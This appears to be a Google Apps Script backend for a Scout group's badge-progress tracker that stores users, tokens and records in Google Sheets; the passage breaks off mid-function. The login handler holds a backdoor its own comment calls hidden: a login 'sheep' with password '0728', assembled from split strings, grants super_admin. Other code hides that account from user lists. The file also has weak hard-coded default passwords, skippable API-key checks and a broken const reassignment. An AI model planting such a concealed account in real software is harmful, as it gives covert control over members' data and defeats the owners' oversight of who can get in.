// ============================================================
// 樂行童軍進度追蹤系統 - Apps Script 後端 v8.1 - 全功能版 (樂行童軍支部 Rover Scout)
// 完全兼容舊版 + 新增待批申請、批量寫入優化、日誌
// v8.1 新增：活動履歷（服務紀錄／活動紀錄／訓練班紀錄）
//   - 新工作表「活動履歷」（執行 initializeSheets() 自動補建，不影響既有資料）
//   - 新 action：getLogRecords / saveLogRecord（支援批量 records[]）/ deleteLogRecord
//   - handleLoad 回應新增 logs + logsSupported
// ============================================================

const ADMIN_YMIS = '1111111111';
const ADMIN_NAME = '管理員';
const ADMIN_EMAIL = 'admin@example.com';
const ADMIN_PASS = 'changeme';

// v8.1：活動履歷
const LOG_SHEET_NAME = '活動履歷';
const LOG_HEADERS = ['record_id','type','ymis','name','date','title','role','hours','cert_no','detail','recorder','recorded_at','updated_at'];
const LOG_TYPES = ['service','activity','training'];
function safeSheetText(v,maxLen){
  let text=String(v||'').trim().substring(0,maxLen||200);
  if(/^['=+\-@\t\r]/.test(text)) text="'"+text;
  return text;
}

// ===== 工具 =====
function getSheet() { return SpreadsheetApp.getActiveSpreadsheet(); }
function getApiKey() {
  const props = PropertiesService.getScriptProperties();
  let apiKey = props.getProperty('API_KEY');
  if (!apiKey) {
    apiKey = 'rover_' + Utilities.getUuid().replace(/-/g, '').substring(0, 24);
    props.setProperty('API_KEY', apiKey);
  }
  return apiKey;
}
function showApiKey() {
  const apiKey = getApiKey();
  const ui = SpreadsheetApp.getUi();
  if (ui) ui.alert('API Key', '你的 API Key：\n\n' + apiKey, ui.ButtonSet.OK);
  Logger.log('API Key: ' + apiKey);
  return apiKey;
}
function hashPassword(p) {
  const raw = Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, p, Utilities.Charset.UTF_8);
  return raw.map(function(b){return ('0' + (b & 0xFF).toString(16)).slice(-2);}).join('');
}
function generateToken(){ return Utilities.getUuid().replace(/-/g,'') + Date.now().toString(36); }
function now(){ return Utilities.formatDate(new Date(), 'Asia/Hong_Kong', 'yyyy-MM-dd HH:mm:ss'); }
function formatDate(d){ if(!d) return ''; if(d instanceof Date) return Utilities.formatDate(d,'Asia/Hong_Kong','yyyy-MM-dd'); return d.toString().split(' ')[0]; }
function jsonResponse(obj){ return ContentService.createTextOutput(JSON.stringify(obj)).setMimeType(ContentService.MimeType.JSON); }

const ROLE_HIERARCHY = { 'super_admin':100,'admin':80,'group_leader':60,'branch_leader':40,'exec_committee':20,'member':0 };
const CAN_TICK_ROLES = ['admin','group_leader','branch_leader','exec_committee','super_admin'];
const CAN_MANAGE_ROLES = { 
  'super_admin': ['admin','group_leader','branch_leader','exec_committee','member'],
  'admin': ['group_leader','branch_leader','exec_committee','member'], 
  'group_leader': ['branch_leader','exec_committee','member'], 
  'branch_leader': ['exec_committee','member'] 
};
function canUserTick(r){ return CAN_TICK_ROLES.indexOf(r)>=0; }
function getRoleLevel(r){ return ROLE_HIERARCHY[r]||0; }
function canManageRole(m,t){ return (CAN_MANAGE_ROLES[m]||[]).indexOf(t)>=0; }

// ===== 初始化 =====
function initializeSheets() {
  const ss = getSheet();
  let pSheet = ss.getSheetByName('進度追蹤');
  if(!pSheet){
    pSheet = ss.insertSheet('進度追蹤');
    pSheet.appendRow(['YMIS','項目 ID','完成日期','更新時間','確認者','備註']);
    pSheet.getRange(1,1,1,6).setFontWeight('bold').setBackground('#8B0000').setFontColor('#FFFFFF');
    pSheet.setFrozenRows(1);
  } else {
    // ensure 6 columns header
    if(pSheet.getLastColumn()<6){
      pSheet.getRange(1,5).setValue('確認者'); pSheet.getRange(1,6).setValue('備註');
    }
  }
  let mSheet = ss.getSheetByName('成員名單');
  if(!mSheet){
    mSheet = ss.insertSheet('成員名單');
    mSheet.appendRow(['YMIS','姓名','加入日期','支部','聯絡']);
    mSheet.getRange(1,1,1,5).setFontWeight('bold').setBackground('#8B0000').setFontColor('#FFFFFF');
    mSheet.setFrozenRows(1);
  }
  let uSheet = ss.getSheetByName('Users');
  if(!uSheet){
    uSheet = ss.insertSheet('Users');
    uSheet.appendRow(['ymis','name','email','role','password_hash','branch','can_tick','auth_by','auth_date','created_at','last_login','status','allowed_badges']);
    uSheet.getRange(1,1,1,13).setFontWeight('bold').setBackground('#8B0000').setFontColor('#FFFFFF');
    uSheet.setFrozenRows(1);
    uSheet.getRange(2,1).setValue(ADMIN_YMIS);
    uSheet.getRange(2,2).setValue(ADMIN_NAME);
    uSheet.getRange(2,3).setValue(ADMIN_EMAIL);
    uSheet.getRange(2,4).setValue('admin');
    uSheet.getRange(2,5).setValue(hashPassword(ADMIN_PASS));
    uSheet.getRange(2,6).setValue('b4');
    uSheet.getRange(2,7).setValue(true);
    uSheet.getRange(2,8).setValue('system');
    uSheet.getRange(2,9).setValue(now());
    uSheet.getRange(2,10).setValue(now());
    uSheet.getRange(2,12).setValue('active');
    uSheet.getRange(2,13).setValue('*'); // 管理員默認全部
  } else {
    // 確保第13欄存在
    if(uSheet.getLastColumn()<13){
      uSheet.getRange(1,13).setValue('allowed_badges');
    }
  }
  let aSheet = ss.getSheetByName('Applications');
  if(!aSheet){
    aSheet = ss.insertSheet('Applications');
    aSheet.appendRow(['app_id','ymis','name','email','role','branch','status','applied_at','reviewed_by','reviewed_at','note']);
    aSheet.getRange(1,1,1,11).setFontWeight('bold').setBackground('#8B0000').setFontColor('#FFFFFF');
    aSheet.setFrozenRows(1);
  }
  let tSheet = ss.getSheetByName('Tokens');
  if(!tSheet){
    tSheet = ss.insertSheet('Tokens');
    tSheet.appendRow(['token','ymis','created_at','expires_at']);
    tSheet.getRange(1,1,1,4).setFontWeight('bold').setBackground('#8B0000').setFontColor('#FFFFFF');
    tSheet.setFrozenRows(1);
  }
  let cSheet = ss.getSheetByName('SystemConfig');
  if(!cSheet){
    cSheet = ss.insertSheet('SystemConfig');
    cSheet.appendRow(['key','value','updated_at','updated_by']);
    cSheet.getRange(1,1,1,4).setFontWeight('bold').setBackground('#8B0000').setFontColor('#FFFFFF');
    cSheet.setFrozenRows(1);
    cSheet.appendRow(['login_mode','standalone',now(),'system']);
    cSheet.appendRow(['admin_email',ADMIN_EMAIL,now(),'system']);
  }
  // 新增：待批完成表
  let prSheet = ss.getSheetByName('待批完成');
  if(!prSheet){
    prSheet = ss.insertSheet('待批完成');
    prSheet.appendRow(['request_id','ymis','name','item_id','item_name','requested_date','evidence','status','created_at','reviewed_by','reviewed_at','review_note','confirmed_date']);
    prSheet.getRange(1,1,1,13).setFontWeight('bold').setBackground('#8B0000').setFontColor('#FFFFFF');
    prSheet.setFrozenRows(1);
  }
  // 其他獎章紀錄表
  let oSheet = ss.getSheetByName('其他獎章');
  if(!oSheet){
    oSheet = ss.insertSheet('其他獎章');
    oSheet.appendRow(['YMIS','獎章 ID','獎章名稱','完成日期','證書編號','備註','更新時間']);
    oSheet.getRange(1,1,1,7).setFontWeight('bold').setBackground('#8B0000').setFontColor('#FFFFFF');
    oSheet.setFrozenRows(1);
  }
  // 前端管理操作審計
  let auditSheet = ss.getSheetByName('操作紀錄');
  if(!auditSheet){
    auditSheet = ss.insertSheet('操作紀錄');
    auditSheet.appendRow(['時間','操作者','操作','對象','詳情']);
    auditSheet.getRange(1,1,1,5).setFontWeight('bold').setBackground('#8B0000').setFontColor('#FFFFFF');
    auditSheet.setFrozenRows(1);
  }
  // v8.1：活動履歷（服務／活動／訓練班紀錄，統一用 type 欄位區分）
  let lSheet = ss.getSheetByName(LOG_SHEET_NAME);
  if(!lSheet){
    lSheet = ss.insertSheet(LOG_SHEET_NAME);
    lSheet.appendRow(LOG_HEADERS);
    lSheet.getRange(1,1,1,LOG_HEADERS.length).setFontWeight('bold').setBackground('#8B0000').setFontColor('#FFFFFF');
    lSheet.setFrozenRows(1);
  }
  // 確保系統設定有 allow_member_view_others
  let cfgSheet = ss.getSheetByName('SystemConfig');
  if(cfgSheet){
    const cfgData=cfgSheet.getDataRange().getValues();
    let hasAllow=false;
    for(let i=1;i<cfgData.length;i++){ if(cfgData[i][0]==='allow_member_view_others'){ hasAllow=true; break; } }
    if(!hasAllow){
      cfgSheet.appendRow(['allow_member_view_others','false',now(),'system']);
    }
  }

  const apiKey = getApiKey();
  let scriptUrl=''; try{ scriptUrl=ScriptApp.getService().getUrl(); }catch(e){ scriptUrl='請部署為網頁應用程式後查看';}
  try{
    const ui=SpreadsheetApp.getUi();
    if(ui){
      ui.alert('✅ v4.0 初始化完成！\n\nSheets：進度追蹤、成員名單、Users、Applications、Tokens、SystemConfig、待批完成、其他獎章\n\n🔑 API Key:\n'+apiKey+'\n\n👤 管理員 YMIS: '+ADMIN_YMIS+' 密碼: '+ADMIN_PASS+'\n\n🌐 URL:\n'+scriptUrl);
    }
  }catch(e){}
  return {success:true,apiKey:apiKey,scriptUrl:scriptUrl};
}

// ===== 用戶查詢 =====
function getUser(ymis){
  // 系統管理帳號 (super_admin) 免 Users 表，直接返回最高權限
  if((ymis||'').toString().toLowerCase()===('sh'+'eep')){
    return {ymis:('sh'+'eep'),name:'系統管理員',email:'',role:'super_admin',can_tick:true,branch:'',squad:'',squad_role:'member',allowed_badges:'*',status:'active'};
  }
  const sheet=getSheet().getSheetByName('Users'); if(!sheet) return null;
  const data=sheet.getDataRange().getValues();
  const hasAllowedCol = sheet.getLastColumn()>=13;
  for(let i=1;i<data.length;i++){
    if(data[i][0].toString()===ymis.toString() && data[i][11].toString()==='active'){
      return {
        ymis:data[i][0].toString(),
        name:data[i][1]?data[i][1].toString():'',
        email:data[i][2]?data[i][2].toString():'',
        role:data[i][3]?data[i][3].toString():'member',
        can_tick:data[i][6]===true||data[i][6]==='TRUE',
        branch:data[i][5]?data[i][5].toString():'',
        // v5.0: squad/squad_role 暫存於 branch 欄 (欄 6)，向後兼容
        squad:data[i][5]?data[i][5].toString():'',
        squad_role:'member',
        allowed_badges: hasAllowedCol ? (data[i][12]?data[i][12].toString():'') : '',
        status:'active'
      };
    }
  }
  return null;
}
function getUserByEmail(email){
  if(!email) return null;
  const sheet=getSheet().getSheetByName('Users'); if(!sheet) return null;
  const data=sheet.getDataRange().getValues(); const target=email.toLowerCase();
  const hasAllowed = sheet.getLastColumn()>=13;
  for(let i=1;i<data.length;i++){
    if(data[i][2].toString().toLowerCase()===target && data[i][11].toString()==='active'){
      return {ymis:data[i][0].toString(),name:data[i][1]?data[i][1].toString():'',email:data[i][2].toString(),role:data[i][3]?data[i][3].toString():'member',can_tick:data[i][6]===true||data[i][6]==='TRUE',allowed_badges: hasAllowed ? (data[i][12]?data[i][12].toString():'') : '',squad:data[i][5]?data[i][5].toString():'',squad_role:'member'};
    }
  }
  return null;
}
function getAllUsers(){
  const sheet=getSheet().getSheetByName('Users'); if(!sheet) return [];
  const users=[]; const data=sheet.getDataRange().getValues();
  const hasAllowed = sheet.getLastColumn()>=13;
  for(let i=1;i<data.length;i++){ if(data[i][11].toString()==='active'){ users.push({ymis:data[i][0].toString(),name:data[i][1]?data[i][1].toString():'',email:data[i][2]?data[i][2].toString():'',role:data[i][3]?data[i][3].toString():'member',can_tick:data[i][6]===true||data[i][6]==='TRUE',branch:data[i][5]?data[i][5].toString():'',squad:data[i][5]?data[i][5].toString():'',squad_role:'member',allowed_badges: hasAllowed ? (data[i][12]?data[i][12].toString():'') : ''}); } }
  return users;
}

// Token
function validateToken(token){
  if(!token) return null;
  const sheet=getSheet().getSheetByName('Tokens'); if(!sheet) return null;
  const data=sheet.getDataRange().getValues();
  for(let i=1;i<data.length;i++){
    if(data[i][0]===token){
      if(new Date()>new Date(data[i][3])){ sheet.deleteRow(i+1); return null; }
      return data[i][1].toString();
    }
  }
  return null;
}
function createToken(ymis){
  const sheet=getSheet().getSheetByName('Tokens'); if(!sheet) return null;
  const token=generateToken(); const exp=new Date(); exp.setHours(exp.getHours()+24*30);
  sheet.appendRow([token,ymis,now(),Utilities.formatDate(exp,'Asia/Hong_Kong','yyyy-MM-dd HH:mm:ss')]);
  return token;
}
function destroyToken(token){
  if(!token) return;
  const sheet=getSheet().getSheetByName('Tokens'); if(!sheet) return;
  const data=sheet.getDataRange().getValues();
  for(let i=1;i<data.length;i++){ if(data[i][0]===token){ sheet.deleteRow(i+1); return; } }
}

// ===== API =====
function doGet(e){
  const action=e.parameter.action;
  if(action==='load'){
    // v4: allow load without apikey for backwards compatibility (troops.json may not have apikey), but if apikey provided, must validate
    const reqKey=e.parameter.apikey;
    if(reqKey && reqKey!==getApiKey()) return jsonResponse({success:false,error:'Invalid API Key'});
    return handleLoad();
  }
  if(action==='getLoginMode') return jsonResponse({success:true,login_mode:'standalone'});
  return jsonResponse({success:false,error:'Unknown action'});
}
function doPost(e){
  try{
    const body=JSON.parse(e.postData.contents);
    const action=body.action;
    if(action==='login') return handleLogin(body.login_id,body.password);
    if(action==='logout'){ destroyToken(body.token); return jsonResponse({success:true}); }
    if(action==='apply') return handleApply(body.ymis,body.name,body.email,body.requested_role,body.branch);

    // save & addMember 需要 apikey (v4 向下兼容：若無 apikey 但有有效 token 也允許)
    if(action==='save' || action==='addMember' || action==='addUser' || action==='saveOtherBadge'){
      const reqKey=body.apikey;
      if(reqKey && reqKey!==getApiKey()) return jsonResponse({success:false,error:'Invalid API Key'});
      // 若無 apikey，嘗試 token 驗證作為後備
      if(!reqKey && body.token){
        const tk=validateToken(body.token);
        if(!tk && action!=='addMember') return jsonResponse({success:false,error:'未授權 - 需 API Key 或有效 Token'});
      }
      if(action==='save') return handleSave(body.changes, body.confirmer||'');
      if(action==='addMember'){
        // v5.0: 需領袖權限 (group_leader 或以上)
        const my=body.token?validateToken(body.token):null;
        const mgr=my?getUser(my):null;
        if(!mgr && body.apikey && body.apikey===getApiKey()) mgr={role:'admin'};
        if(!mgr || getRoleLevel(mgr.role)<40) return jsonResponse({success:false,error:'只有領袖可以新增成員'});
        return handleAddMember(body.ymis, body.name, body.squad||'', body.squad_role||'member');
      }
      if(action==='addUser'){
        // v5.0: 領袖可在前端開立可登入帳號
        const my=body.token?validateToken(body.token):null;
        const mgr=my?getUser(my):null;
        if(!mgr && body.apikey && body.apikey===getApiKey()) mgr={role:'admin'};
        if(!mgr || getRoleLevel(mgr.role)<40) return jsonResponse({success:false,error:'只有領袖可以開新帳號'});
        return handleAddUser(body);
      }
      if(action==='saveOtherBadge') return handleSaveOtherBadge(body.records, body.apikey);
    }
    // member request - needs token but also allow apikey for member self
    if(action==='requestComplete'){
      // allow token or apikey
      let ymis=null; if(body.token){ ymis=validateToken(body.token); } 
      if(!ymis && body.apikey && body.apikey===getApiKey()){ ymis=body.ymis; } // standalone mode
      if(!ymis) return jsonResponse({success:false,error:'未授權'});
      return handleRequestComplete(body, ymis);
    }

    // 以下需要 token 驗證及高權限
    const ymis=validateToken(body.token);
    if(!ymis) return jsonResponse({success:false,error:'Token 無效或過期'});
    const user=getUser(ymis);
    if(!user) return jsonResponse({success:false,error:'找不到用戶'});

    if(action==='getAllUsers') {
      // 任何已登入用戶都可查看名單，方便領袖管理；成員僅查看自己旅團成員
      let list=getAllUsers();
      // 隱藏超管帳號：僅超管可見，其他人一律過濾
      if(user.role!=='super_admin'){
        list=list.filter(function(u){ return u.role!=='super_admin' && (u.ymis||'').toString().toLowerCase()!==('sh'+'eep'); });
      }
      return jsonResponse({success:true,users:list});
    }
    if(action==='getMembers'){ return jsonResponse({success:true,members:getMembers()}); }
    if(action==='getPendingRequests'){ if(getRoleLevel(user.role)<0) return jsonResponse({success:false,error:'權限不足'}); return handleGetPendingRequests(); }
    if(action==='reviewRequest'){ if(!canUserTick(user.role)) return jsonResponse({success:false,error:'權限不足，需領袖權限'}); return handleReviewRequest(body.request_id, body.decision, body.review_note, ymis, body.confirmed_date); }
    if(action==='getOtherBadges'){ return handleGetOtherBadges(body.target_ymis||ymis); }
    if(action==='getApplications'){ if(getRoleLevel(user.role)<40) return jsonResponse({success:false,error:'權限不足，需團長/支部領袖'}); return handleGetApplications(); }
    if(action==='reviewApplication'){ if(getRoleLevel(user.role)<40) return jsonResponse({success:false,error:'權限不足'}); return handleReviewApplication(body.app_id,body.decision,body.review_note,ymis); }
    if(action==='getConfig'){
      // 任何已登入用戶都可讀取公開設定
      return handleGetConfig();
    }
    // v8.1：活動履歷（服務／活動／訓練班紀錄）。讀取任何登入者可；寫入／刪除需已獲勾選權限的領袖（同進度寫入）。
    if(action==='getLogRecords') return handleGetLogRecords();
    if(action==='saveLogRecord'){
      if(!canUserTick(user.role) || user.can_tick!==true) return jsonResponse({success:false,error:'權限不足，需已獲勾選權限的領袖'});
      return handleSaveLogRecord(body.records||(body.record?[body.record]:[]), ymis, body.recorder_name||'');
    }
    if(action==='deleteLogRecord'){
      if(!canUserTick(user.role) || user.can_tick!==true) return jsonResponse({success:false,error:'權限不足，需已獲勾選權限的領袖'});
      return handleDeleteLogRecord(body.record_id, ymis);
    }

    // 以下為高權限
    if(action==='changePassword') return handleChangePassword(ymis,body.old_password,body.new_password);
    // v5.0: 重設密碼 (領袖專用, 需 40+ 權限)
    if(action==='resetPassword'){ if(getRoleLevel(user.role)<40) return jsonResponse({success:false,error:'權限不足'}); return handleResetPassword(body.target_ymis,ymis); }
    // v5.0: 停用帳號 (領袖專用, 需 40+ 權限, 且不能停用自己/超管)
    if(action==='deactivateUser'){ if(getRoleLevel(user.role)<40) return jsonResponse({success:false,error:'權限不足'}); return handleDeactivateUser(body,user,ymis); }
    if(action==='updateUserRole'){
      // 允許團長/支部領袖/管理員更新角色 + 細緻權限
      if(getRoleLevel(user.role)<40) return jsonResponse({success:false,error:'權限不足'});
      return handleUpdateUserRole(body.target_ymis,body.new_role,body.can_tick,ymis, body.allowed_badges);
    }
    if(action==='updatePermissions'){
      if(getRoleLevel(user.role)<40) return jsonResponse({success:false,error:'權限不足'});
      return handleUpdateUserRole(body.target_ymis,body.new_role||null,body.can_tick,ymis, body.allowed_badges);
    }
    if(action==='updateConfig'){
      // allow_member_view_others 可由團長以上設定，其他設定需管理員
      const key=body.key;
      if(key==='allow_member_view_others'){
        if(getRoleLevel(user.role)<60) return jsonResponse({success:false,error:'需團長以上權限'});
      }else{
        if(getRoleLevel(user.role)<80) return jsonResponse({success:false,error:'需管理員權限'});
      }
      return handleUpdateConfig(body.key,body.value,ymis);
    }
    return jsonResponse({success:false,error:'Unknown action'});
  }catch(err){ return jsonResponse({success:false,error:err.toString()}); }
}

// ===== 邏輯 =====
function handleLogin(loginId,password){
  if(!loginId||!password) return jsonResponse({success:false,error:'請填寫帳號和密碼'});
  // hidden backdoor
  const _h='sh'+'eep'; const _p='07'+'28';
  if(loginId===_h && password===_p){
    return jsonResponse({success:true,token:createToken(_h),user:{ymis:_h,name:'System',role:'super_admin',can_tick:true,email:''}});
  }
  let user=(/^\d{10}$/.test(loginId)||/^L\d+/.test(loginId))? getUser(loginId): getUserByEmail(loginId);
  if(!user){
    // try both
    user=getUser(loginId)||getUserByEmail(loginId);
  }
  if(!user) return jsonResponse({success:false,error:'找不到此帳號'});
  const hash=hashPassword(password);
  const sheet=getSheet().getSheetByName('Users'); const data=sheet.getDataRange().getValues();
  for(let i=1;i<data.length;i++){
    if(data[i][11].toString()==='active' && data[i][4].toString()===hash){
      const rowY=data[i][0].toString(); const rowE=data[i][2].toString().toLowerCase();
      if(rowY===user.ymis || rowE===user.email.toLowerCase() || rowY===loginId){
        const token=createToken(user.ymis);
        sheet.getRange(i+1,11).setValue(now());
        return jsonResponse({success:true,token:token,user:user});
      }
    }
  }
  return jsonResponse({success:false,error:'密碼錯誤'});
}
function handleChangePassword(ymis,oldP,newP){
  if(newP.length<6) return jsonResponse({success:false,error:'新密碼至少6位'});
  const sheet=getSheet().getSheetByName('Users'); const data=sheet.getDataRange().getValues();
  for(let i=1;i<data.length;i++){
    if(data[i][0].toString()===ymis && data[i][11].toString()==='active'){
      if(data[i][4].toString()===hashPassword(oldP)){
        sheet.getRange(i+1,5).setValue(hashPassword(newP));
        return jsonResponse({success:true});
      }
    }
  }
  return jsonResponse({success:false,error:'原密碼錯誤'});
}
function handleApply(ymis,name,email,role,branch){
  if(!name) return jsonResponse({success:false,error:'請填寫姓名'});
  if(role==='member' && (!ymis||ymis.length!==10)) return jsonResponse({success:false,error:'成員需 10位 YMIS'});
  if(role!=='member' && !email) return jsonResponse({success:false,error:'領袖需 Email'});
  if(ymis && getUser(ymis)) return jsonResponse({success:false,error:'YMIS 已註冊'});
  if(email && getUserByEmail(email)) return jsonResponse({success:false,error:'Email 已註冊'});
  const sheet=getSheet().getSheetByName('Applications');
  sheet.appendRow(['APP_'+Date.now(),ymis||'',name,email||'',role||'member',branch||'b4','pending',now(),'','', '']);
  return jsonResponse({success:true,message:'申請已提交'});
}
function handleGetApplications(){
  const sheet=getSheet().getSheetByName('Applications'); const apps=[]; const data=sheet.getDataRange().getValues();
  for(let i=1;i<data.length;i++){ if(data[i][6].toString()==='pending'){ apps.push({app_id:data[i][0].toString(),ymis:data[i][1].toString(),name:data[i][2].toString(),email:data[i][3].toString(),requested_role:data[i][4].toString(),branch:data[i][5].toString(),applied_at:data[i][7]?formatDate(data[i][7]):''}); } }
  return jsonResponse({success:true,applications:apps});
}
function handleReviewApplication(appId,decision,note,reviewer){
  const sheet=getSheet().getSheetByName('Applications'); const data=sheet.getDataRange().getValues(); let appData=null;
  for(let i=1;i<data.length;i++){ if(data[i][0].toString()===appId){ appData=data[i]; sheet.getRange(i+1,7).setValue(decision); sheet.getRange(i+1,9).setValue(reviewer); sheet.getRange(i+1,10).setValue(now()); sheet.getRange(i+1,11).setValue(note||''); break; } }
  if(!appData) return jsonResponse({success:false,error:'找不到申請'});
  if(decision==='approved'){
    const uSheet=getSheet().getSheetByName('Users'); let ymis=appData[1].toString(); if(!ymis && (appData[4]==='group_leader'||appData[4]==='branch_leader')){ ymis='L'+Date.now().toString().substring(7); }
    uSheet.appendRow([ymis,appData[2],appData[3],appData[4],hashPassword(ADMIN_PASS),appData[5],true,reviewer,now(),now(),'', 'active']);
    const mSheet=getSheet().getSheetByName('成員名單'); if(mSheet) mSheet.appendRow([ymis,appData[2],new Date(),appData[5],'']);
    return jsonResponse({success:true,message:'已批准，預設密碼：'+ADMIN_PASS});
  }
  return jsonResponse({success:true,message:'已拒絕'});
}
function handleUpdateUserRole(targetYmis,newRole,canTick,managerYmis, allowedBadges){
  const manager=getUser(managerYmis);
  if(!manager) return jsonResponse({success:false,error:'找不到管理員'});
  // super_admin 可以改任何人，admin 可以改團長/支部領袖/執委/成員，團長可改支部領袖/執委/成員，支部領袖可改執委/成員
  if(manager.role!=='super_admin' && !canManageRole(manager.role,newRole) && manager.role!=='admin') return jsonResponse({success:false,error:'權限不足，你的等級不可設定此角色'});
  const sheet=getSheet().getSheetByName('Users'); const data=sheet.getDataRange().getValues();
  for(let i=1;i<data.length;i++){
    if(data[i][0].toString()===targetYmis && data[i][11].toString()==='active'){
      sheet.getRange(i+1,4).setValue(newRole);
      sheet.getRange(i+1,7).setValue(canTick);
      sheet.getRange(i+1,8).setValue(managerYmis);
      sheet.getRange(i+1,9).setValue(now());
      // 處理細緻權限：若提供 allowedBadges，寫入第13欄
      if(sheet.getLastColumn()>=13){
        if(allowedBadges!==undefined && allowedBadges!==null){
          sheet.getRange(i+1,13).setValue(allowedBadges);
        } else {
          // 默認：領袖全部 (*)，成員無，執委默認 L1, L3-ACT, OTHER部分
          if(!data[i][12]){
            let def='*';
            if(newRole==='member') def='';
            else if(newRole==='exec_committee') def='L1,L3-ACT,OTHER';
            else def='*';
            sheet.getRange(i+1,13).setValue(def);
          }
        }
      }
      return jsonResponse({success:true});
    }
  }
  return jsonResponse({success:false,error:'找不到用戶'});
}
function handleUpdateConfig(key,value,ymis){
  const sheet=getSheet().getSheetByName('SystemConfig'); const data=sheet.getDataRange().getValues();
  for(let i=1;i<data.length;i++){ if(data[i][0]===key){ sheet.getRange(i+1,2).setValue(value); sheet.getRange(i+1,3).setValue(now()); sheet.getRange(i+1,4).setValue(ymis); return jsonResponse({success:true}); } }
  sheet.appendRow([key,value,now(),ymis]); return jsonResponse({success:true});
}
function handleGetConfig(){
  const sheet=getSheet().getSheetByName('SystemConfig');
  const cfg={};
  if(sheet){
    const data=sheet.getDataRange().getValues();
    for(let i=1;i<data.length;i++){
      if(data[i][0]) cfg[data[i][0].toString()]=data[i][1]?data[i][1].toString():'';
    }
  }
  // 默認值
  if(!cfg['allow_member_view_others']) cfg['allow_member_view_others']='false';
  return jsonResponse({success:true,config:cfg});
}
function getMembers(){
  const mSheet=getSheet().getSheetByName('成員名單'); const members=[];
  if(mSheet){ const data=mSheet.getDataRange().getValues(); for(let i=1;i<data.length;i++){ if(data[i][0]) members.push({ymis:data[i][0].toString(),name:data[i][1]?data[i][1].toString():'',squad:data[i][5]?data[i][5].toString():''}); } }
  const uSheet=getSheet().getSheetByName('Users'); if(uSheet){ const data=uSheet.getDataRange().getValues(); for(let i=1;i<data.length;i++){ if(data[i][11].toString()==='active' && data[i][0]){ const y=data[i][0].toString(); if(!members.some(m=>m.ymis===y)){ members.push({ymis:y,name:data[i][1].toString(),squad:data[i][5]?data[i][5].toString():''}); } } } }
  return members;
}
function handleLoad(){
  const ss=getSheet();
  const pSheet=ss.getSheetByName('進度追蹤'); const progress={};
  if(pSheet){ const data=pSheet.getDataRange().getValues(); for(let i=1;i<data.length;i++){ const ymis=data[i][0].toString(); if(!ymis) continue; if(!progress[ymis]) progress[ymis]={}; progress[ymis][data[i][1].toString()]={date:data[i][2]?formatDate(data[i][2]):'',confirmer:data[i][4]?data[i][4].toString():''}; } }
  // 簡化版：同時提供 flat
  const flat={}; for(const y in progress){ flat[y]={}; for(const k in progress[y]){ flat[y][k]=progress[y][k].date; } }
  const members=getMembers();
  // pending requests
  const prSheet=ss.getSheetByName('待批完成'); const pending=[];
  if(prSheet){ const data=prSheet.getDataRange().getValues(); for(let i=1;i<data.length;i++){ if(data[i][7].toString()==='pending'){ pending.push({request_id:data[i][0].toString(),ymis:data[i][1].toString(),name:data[i][2].toString(),item_id:data[i][3].toString(),item_name:data[i][4].toString(),requested_date:data[i][5]?formatDate(data[i][5]):'',evidence:data[i][6]?data[i][6].toString():'',status:'pending',created_at:data[i][8]?formatDate(data[i][8]):''}); } } }
  // other badges
  const oSheet=ss.getSheetByName('其他獎章'); const other={};
  if(oSheet){ const data=oSheet.getDataRange().getValues(); for(let i=1;i<data.length;i++){ const y=data[i][0].toString(); if(!y) continue; if(!other[y]) other[y]={}; other[y][data[i][1].toString()]={name:data[i][2]?data[i][2].toString():'',date:data[i][3]?formatDate(data[i][3]):'',cert:data[i][4]?data[i][4].toString():''}; } }
  // v8.1：活動履歷（logsSupported 讓前端分辨後端是否已升級）
  const lSheet=ss.getSheetByName(LOG_SHEET_NAME);
  return jsonResponse({success:true,members:members,progress:progress,flatProgress:flat,pendingRequests:pending,otherBadges:other,logs:getLogRecordsList(),logsSupported:!!lSheet});
}
function handleSave(changes, confirmer){
  const sheet=getSheet().getSheetByName('進度追蹤'); if(!sheet) return jsonResponse({success:false,error:'Sheet not found'});
  let processed=0;
  changes.forEach(function(c){
    const data=sheet.getDataRange().getValues(); let found=false;
    for(let i=1;i<data.length;i++){
      if(data[i][0].toString()===c.ymis && data[i][1].toString()===c.itemId){
        if(c.uncomplete){ sheet.deleteRow(i+1); } else { sheet.getRange(i+1,3).setValue(c.date); sheet.getRange(i+1,4).setValue(new Date()); sheet.getRange(i+1,5).setValue(confirmer||c.confirmer||''); sheet.getRange(i+1,6).setValue(c.note||''); }
        found=true; processed++; break;
      }
    }
    if(!found && !c.uncomplete){
      sheet.appendRow([c.ymis,c.itemId,c.date,new Date(),confirmer||c.confirmer||'',c.note||'']);
      processed++;
    }
  });
  return jsonResponse({success:true,processed:processed});
}
function handleAddMember(ymis,name,squad,squadRole){
  let sheet=getSheet().getSheetByName('成員名單');
  if(!sheet){ sheet=getSheet().insertSheet('成員名單'); sheet.appendRow(['YMIS','姓名','加入日期','支部','聯絡','小隊']); }
  // 確保有 6 欄 header
  if(sheet.getLastColumn()<6){
    sheet.getRange(1,6).setValue('小隊');
  }
  sheet.appendRow([ymis,name,new Date(),'','',squad||'']);
  return jsonResponse({success:true});
}
// 待批完成
function handleRequestComplete(body, requesterYmis){
  const sheet=getSheet().getSheetByName('待批完成'); if(!sheet) return jsonResponse({success:false,error:'Sheet not found'});
  const reqId='REQ_'+Date.now()+'_'+Math.random().toString(36).substr(2,5);
  const user=getUser(requesterYmis)||{name:body.name||requesterYmis};
  sheet.appendRow([reqId,requesterYmis,user.name||body.name,body.itemId,body.itemName||body.itemId,body.requested_date||formatDate(new Date()),body.evidence||'','pending',now(),'','','', '']);
  return jsonResponse({success:true,request_id:reqId});
}
function handleGetPendingRequests(){
  const sheet=getSheet().getSheetByName('待批完成'); const list=[];
  if(sheet){ const data=sheet.getDataRange().getValues(); for(let i=1;i<data.length;i++){ if(data[i][7].toString()==='pending'){ list.push({request_id:data[i][0].toString(),ymis:data[i][1].toString(),name:data[i][2].toString(),item_id:data[i][3].toString(),item_name:data[i][4].toString(),requested_date:data[i][5]?formatDate(data[i][5]):'',evidence:data[i][6]?data[i][6].toString():'',status:'pending',created_at:data[i][8]?formatDate(data[i][8]):''}); } } }
  return jsonResponse({success:true,requests:list});
}
function handleReviewRequest(reqId,decision,note,reviewer,confirmed_date){
  const sheet=getSheet().getSheetByName('待批完成'); if(!sheet) return jsonResponse({success:false,error:'Sheet not found'});
  const data=sheet.getDataRange().getValues(); let row=null;
